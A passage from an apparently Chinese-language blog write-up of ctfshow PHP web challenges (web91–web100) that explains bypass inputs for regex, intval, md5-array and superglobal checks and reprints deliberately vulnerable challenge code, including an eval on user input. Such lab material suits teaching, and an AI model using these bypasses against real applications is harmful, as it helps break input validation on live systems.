nonononono<br></code></pre></td></tr></table></figure><p>我们需要构造一个输入使得它满足两个正则表达式条件：第一个正则（带多行模式）匹配成功，而第二个正则（不带多行模式）匹配失败。</p><p> <code>/i </code>表示匹配的时候不区分大小写</p><p> <code>/m </code>表示多行匹配 </p><p><code>^$</code>符号表示匹配每一行的开头结尾</p><ol><li><strong>多行模式匹配：</strong> 第一个正则<code>/^php$/im</code>中的<code>m</code>修饰符允许<code>^</code>和<code>$</code>匹配每行的开头和结尾。只要有一行是<code>php</code>，则匹配成功。</li><li><strong>单行模式不匹配：</strong> 第二个正则<code>/^php$/i</code>要求整个字符串必须完全匹配<code>php</code>，且没有多行模式，因此必须整个字符串都是<code>php</code>。</li></ol><p><strong>构造Payload：</strong></p><p>在输入中添加换行符<code>%0a</code>，使得其中一行是<code>php</code>，但整个字符串不以<code>php</code>结尾。例如：<code>php%0a</code>。这样，第一行是<code>php</code>，满足第一个正则；整个字符串是<code>php\n</code>，不符合第二个正则的完整匹配。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?cmd=php%0a<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022030117.png"></p><p>这里发现这个payload并不能使用</p><p>错误原因：（这里询问了ai）</p><ul><li>输入内容为 <code>php\n</code>（<code>php</code> 后跟换行符）。</li><li><strong>第一个正则匹配成功</strong>：第一行是 <code>php</code>，符合多行模式。</li><li><strong>第二个正则也匹配成功</strong>：PHP 的 <code>preg_match</code> 在单行模式下，<code>$</code> 会忽略末尾的换行符！因此实际匹配的是 <code>php</code>，导致输出 <code>hacker</code>。</li><li>这是 PHP 正则表达式的一个特性：默认情况下，<code>$</code> 匹配字符串结尾或结尾的换行符前的位置（即使没有 <code>m</code> 修饰符）。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?cmd=%0aphp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031488.png"></p><p>换位置后发现可以返回flag</p><ul><li>输入内容为 <code>\nphp</code>（换行符后跟 <code>php</code>）。</li><li><strong>第一个正则匹配成功</strong>：第二行是 <code>php</code>，符合多行模式。</li><li><strong>第二个正则匹配失败</strong>：整个字符串是 <code>\nphp</code>，不以 <code>php</code> 开头，因此无法匹配。</li></ul><hr><p>补充知识：</p><p><strong>正则运算符</strong></p><p>正则运算符是用于处理<strong>文本匹配</strong>的工具，主要用于在字符串中查找、替换或提取符合特定规则的文本。你可以把它理解为一个“文本过滤器”，帮助你快速找到想要的文字内容。</p><hr><p><strong>正则运算符的基本符号：</strong></p><ol><li><code>.</code>：匹配任意单个字符（除了换行符）。例如：<code>a.b</code> 可以匹配 <code>aab</code>、<code>acb</code>、<code>a1b</code> 等。</li><li><code>\*</code>：匹配前面的字符 0 次或多次。例如：<code>ab*</code> 可以匹配 <code>a</code>、<code>ab</code>、<code>abb</code>、<code>abbb</code> 等。</li><li><code>+</code>：匹配前面的字符 1 次或多次。例如：<code>ab+</code> 可以匹配 <code>ab</code>、<code>abb</code>、<code>abbb</code>，但不能匹配 <code>a</code>。</li><li><code>?</code>：匹配前面的字符 0 次或 1 次。例如：<code>ab?</code> 可以匹配 <code>a</code> 或 <code>ab</code>。</li><li><code>\d</code>：匹配数字（0-9）。例如：<code>\d+</code> 可以匹配 <code>123</code>、<code>4567</code> 等。</li><li><code>\w</code>：匹配字母、数字或下划线。例如：<code>\w+</code> 可以匹配 <code>abc</code>、<code>123</code>、<code>a_1</code> 等。</li><li><code>[]</code>：匹配括号内的任意一个字符。例如：<code>[abc]</code> 可以匹配 <code>a</code>、<code>b</code> 或 <code>c</code>。</li><li><code>^</code>：匹配字符串的开头。例如：<code>^abc</code> 可以匹配以 <code>abc</code> 开头的字符串。</li><li><code>$</code>：匹配字符串的结尾。例如：<code>abc$</code> 可以匹配以 <code>abc</code> 结尾的字符串。</li><li><code>^ &amp;</code>：匹配字符串例如：<code>^abc&amp;</code>匹配以abc开头和以abc结尾的字符串，实际上是只有abc与之匹配</li><li><code>&quot;notice&quot;</code>: 匹配包含notice的字符串；</li><li></li></ol><p>简单示例：</p><p>假设你有一段文字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">我的电话是 123-4567-8901，邮箱是 abc@example.com。<br></code></pre></td></tr></table></figure><ul><li>用正则表达式 <code>\d{3}-\d{4}-\d{4}</code> 可以提取出电话号码 <code>123-4567-8901</code>。</li><li>用正则表达式 <code>\w+@\w+\.\w+</code> 可以提取出邮箱 <code>abc@example.com</code>。</li></ul><p><strong>正则运算符的修饰符：</strong></p><ol><li><code>i</code> - 不区分大小写匹配时忽略字母的大小写。</li><li><code>m</code> - 多行模式使 <code>^</code> 和 <code>$</code> 匹配每一行的开始和结束，而不是整个字符串的开始和结束。</li></ol><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>这一关和90一样</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031282.png"></p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031346.png"></p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>首先不能完全等于4476，也不能包含任何字母，strpos函数检查num中是否包含字符&quot;0&quot;（必须包含“0”），最后使用intval函数将num转换为整数</p><p><code>strpos() </code>函数，用于在字符串中查找一个子串的第一次出现位置。如果找到了子串，则返回子串在字符串中的位置（索引），否则返回 false。</p><p>因此我们可以输入4476.0来绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?num=4476.0<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031248.png"></p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p>使用正则表达式检查 $num 是否包含字母或小数点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">if(!strpos($num, &quot;0&quot;))&#123;<br>        die(&quot;no no no!!!&quot;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>检查 $num 中是否包含字符 “0”</p><p>因为有<code>strpos</code> 函数，八进制<code>010574</code>无法让绕过</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031834.png"></p><p>而十六进制<code>0x117c</code> 包含字母 <code>x</code>，因此 <code>preg_match</code> 会匹配成功，无法绕过</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031745.png"></p><p>所以我们在前面加个<code>+</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?num=+010574<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031384.png"></p><p>同样，加空格也可以绕过（空格是<code>%20</code>）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031176.png"></p><h4 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>如果 <code>u</code> 的值是 <code>&#39;flag.php&#39;</code>，会输出 <code>&quot;no no no&quot; </code>并停止执行；</p><p>如果 <code>u</code> 的值不是 <code>&#39;flag.php&#39;</code>，会尝试显示 <code>u</code> 参数指定的文件内容，并以语法高亮的形式展示。</p><p>要想看到flag.php文件，可以使用文件目录操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?u=./flag.php<br></code></pre></td></tr></table></figure><p>&#x2F;   根目录</p><p>.&#x2F;  当前目录</p><p>..&#x2F;  上一个目录</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031668.png"></p><h4 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ol><li><code>if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) {</code>:检查用户是否通过 POST 请求提交了两个参数 <code>a</code> 和 <code>b</code>。如果 <code>a</code> 和 <code>b</code> 都存在，则继续执行下面的代码。</li><li><code>if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])</code>:检查用户提交的 <code>a</code> 和 <code>b</code> 的值是否不相等。如果 <code>a</code> 和 <code>b</code> 的值不相等，则继续执行下面的代码。</li><li><code>if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))</code>:计算 <code>a</code> 和 <code>b</code> 的 MD5 哈希值，并进行严格比较（<code>===</code>）。如果 <code>a</code> 和 <code>b</code> 的 MD5 哈希值相等，则执行 <code>echo $flag;</code>，输出 <code>flag.php</code> 否则，执行 <code>print &#39;Wrong.&#39;;</code>，输出 “Wrong.”。</li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>解题思路：</p><p>需要利用MD5处理数组时的特性。当传入数组时，<code>md5()</code>函数会返回<code>null</code>，并且当两个数组不同但MD5都为<code>null</code>时，严格比较（<code>===</code>）成立。</p><p>所以我们构造数组：</p><ol><li>通过POST提交<code>a</code>和<code>b</code>作为数组，使其值不同但MD5结果均为<code>null</code>。</li><li>确保<code>a</code>不等于<code>b</code>，但它们的MD5哈希严格相等，从而输出flag。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a[]=123&amp;b[]=456<br></code></pre></td></tr></table></figure><p>这里是post传参</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031853.png"></p><h4 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$_GET</span> ? <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_POST</span> : <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] == <span class="hljs-string">&#x27;flag&#x27;</span> ? <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_COOKIE</span> : <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] == <span class="hljs-string">&#x27;flag&#x27;</span> ? <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_SERVER</span> : <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>] == <span class="hljs-string">&#x27;flag&#x27;</span> ? <span class="hljs-variable">$flag</span> : <span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>这个代码有些变扭，用ai转化一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-comment">// 第一次条件：如果存在 GET 参数，将 $_GET 指向 $_POST</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>)) &#123;<br>    <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_POST</span>;<br>&#125;<br><br><span class="hljs-comment">// 第二次条件：检查 $_GET（此时可能指向 $_POST）中的 &#x27;flag&#x27; 参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_COOKIE</span>;<br>&#125;<br><br><span class="hljs-comment">// 第三次条件：检查 $_GET（此时可能指向 $_COOKIE）中的 &#x27;flag&#x27; 参数</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-variable">$_GET</span> = &amp;<span class="hljs-variable">$_SERVER</span>;<br>&#125;<br><br><span class="hljs-comment">// 最终决定显示 flag 还是当前文件</span><br><span class="hljs-variable">$fileToHighlight</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>) ? <span class="hljs-variable">$flag</span> : <span class="hljs-keyword">__FILE__</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$fileToHighlight</span>);<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$_GET[&#x27;flag&#x27;] == &#x27;flag&#x27; ? $_GET = &amp;$_COOKIE : &#x27;flag&#x27;;<br>$_GET[&#x27;flag&#x27;] == &#x27;flag&#x27; ? $_GET = &amp;$_SERVER : &#x27;flag&#x27;;<br></code></pre></td></tr></table></figure><p>这两行代码对最后flag的输出没有影响因为最后源代码的显示主要看get参数HTTP_FLAG&#x3D;flag是否成立</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;] == &#x27;flag&#x27; ? $flag : __FILE__);<br></code></pre></td></tr></table></figure><p>但是我们不能直接get传参HTTP_FLAG&#x3D;flag，因为如果get传参存在的话就会被post覆盖，所以我们可以get传参任意一个数（随便传但是必须有），然后再post传参HTTP_FLAG&#x3D;flag覆盖get所传参数的值，便可以显示flag。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022031522.png"></p><h4 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br><span class="hljs-comment">//flag in class ctfshow;</span><br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshow</span>();<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$v0</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v2</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;/&quot;</span>, <span class="hljs-variable">$v3</span>)) &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-subst">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 